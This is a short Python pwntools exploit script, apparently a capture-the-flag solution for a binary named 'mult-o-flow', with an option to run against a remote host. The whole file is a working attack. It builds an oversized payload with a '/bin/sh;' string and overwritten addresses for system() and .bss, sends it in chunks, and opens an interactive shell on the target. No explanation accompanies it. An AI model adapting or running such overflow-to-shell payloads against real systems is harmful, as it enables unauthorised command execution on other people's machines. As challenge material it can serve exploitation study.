from pwn import *
import time
context.binary = './mult-o-flow'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

if args['REMOTE']:
	p = remote('47.106.94.13', 50025)

else:
	p = process('./mult-o-flow')
	#gdb.attach(p, 'b* 0x48C52')
	raw_input()

system_addr = 0x485E0
binsh = 0x4B124   				#.bss
p.send('a'*64)				    #cover demo to 0
p.recvuntil('tables :-)\n')

dest = ''
dest = dest.ljust(0x1000, 'Z')

isp = "ISP:"+ 'A'*9
isp = isp.rjust(0x200, 'A')

city = 'City:'+ 'B'*9
city = city.rjust(0x200 - 8, 'B')
city = "/bin/sh;" + city

end = 'CCCC' + p32(0x112233)[:-1] + '<' + 'C' * 16 + p32(system_addr)[:-1] + '<' + 'CCCC' +  p32(binsh)[:-1]


payload = dest
payload += isp + city
payload += end
assert len(payload) < 0x1800

for i in range(3):
	p.send(payload[i*0x7ff:i*0x7ff+0x7ff])
	time.sleep(1)

p.interactive()
p.close()